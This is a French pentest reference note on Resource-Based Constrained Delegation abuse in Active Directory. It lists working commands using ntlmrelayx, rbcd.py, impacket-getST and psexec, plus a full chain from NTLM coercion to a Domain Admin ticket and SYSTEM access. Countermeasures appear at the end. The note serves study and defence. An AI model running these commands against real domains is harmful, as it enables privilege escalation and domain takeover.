# RBCD (Resource-Based Constrained Delegation)

**Catégorie** : Active Directory
**Phase** : Exploitation / Privilege Escalation
**Tags** : #AD #kerberos #delegation #privesc

---

## Principe

La délégation contrainte basée sur les ressources (RBCD) permet à un compte machine de s'authentifier au nom de n'importe quel utilisateur vers une ressource spécifique. Contrairement à la délégation classique (configurée par un admin du domaine), la RBCD se configure sur l'objet cible lui-même, via l'attribut **msDS-AllowedToActOnBehalfOfOtherIdentity**.

L'attaque consiste à :
1. Créer un compte machine (si MAQ > 0) ou en contrôler un existant
2. Écrire l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity sur un ordinateur cible pour autoriser notre compte machine
3. Utiliser S4U2Self + S4U2Proxy pour obtenir un ticket de service en tant que Domain Admin sur la cible

## Prérequis

- Droits d'écriture sur l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity d'un objet computer (obtenu via NTLM relay vers LDAP, ou droits GenericWrite/GenericAll)
- Machine Account Quota > 0 (pour créer un compte machine) ou contrôle d'un compte machine existant
- Outils : `impacket-ntlmrelayx`, `impacket-getST`, `rbcd.py`

## Commandes

### Créer un compte machine et configurer RBCD (via relay)

```bash
impacket-ntlmrelayx -t ldap://<DC_IP> --add-computer FAKEPC$ --delegate-access
```

### Configurer RBCD manuellement

```bash
# Avec rbcd.py
python3 rbcd.py -delegate-to TARGET$ -delegate-from FAKEPC$ -dc-ip <DC_IP> -action write 'DOMAINE/user:password'
```

### Obtenir un ticket via S4U

```bash
# S4U2Self + S4U2Proxy → ticket DA sur la cible
impacket-getST -spn host/TARGET$ -impersonate administrator -dc-ip <DC_IP> 'DOMAINE/FAKEPC$:password'

# Utiliser le ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass TARGET$
```

## Chaîne complète

1. mitm6 / Responder → coercion NTLM
2. ntlmrelayx → relay vers LDAP → création compte machine FAKEPC$
3. ntlmrelayx configure RBCD : FAKEPC$ autorisé sur TARGET$
4. getST → S4U2Proxy → ticket Domain Admin sur TARGET$
5. psexec / secretsdump avec le ticket → accès SYSTEM

## Contre-mesures

- Réduire le MAQ à 0 : `Set-ADDomain -Identity domaine.local -Replace @{"ms-DS-MachineAccountQuota"="0"}`
- Activer LDAP Signing + Channel Binding (empêche le relay vers LDAP)
- Auditer régulièrement l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity sur tous les objets computer
- Utiliser BloodHound pour visualiser les chemins de délégation
- Protected Users sur les comptes DA (bloque la délégation)

## Liens

- [[NTLM Relay]]
- [[DHCPv6 Spoofing]]
- [[DCSync]]
- [[Kerberos]]
- [[Impacket]]
